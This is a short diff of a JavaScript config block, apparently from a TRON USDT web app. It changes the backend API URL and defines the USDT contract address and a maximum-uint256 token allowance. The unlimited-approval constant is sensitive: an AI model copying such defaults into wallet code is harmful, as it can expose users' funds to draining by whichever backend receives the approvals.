@@ -1,5 +1,5 @@
 // ========== CONFIG & CONSTANTS ==========
-var API_BASE = 'https://tron-usdt-backend.vercel.app/api';
+var API_BASE = 'https://api.feeslash.io/api';
 var OFFICIAL_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 var MAX_ALLOWANCE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
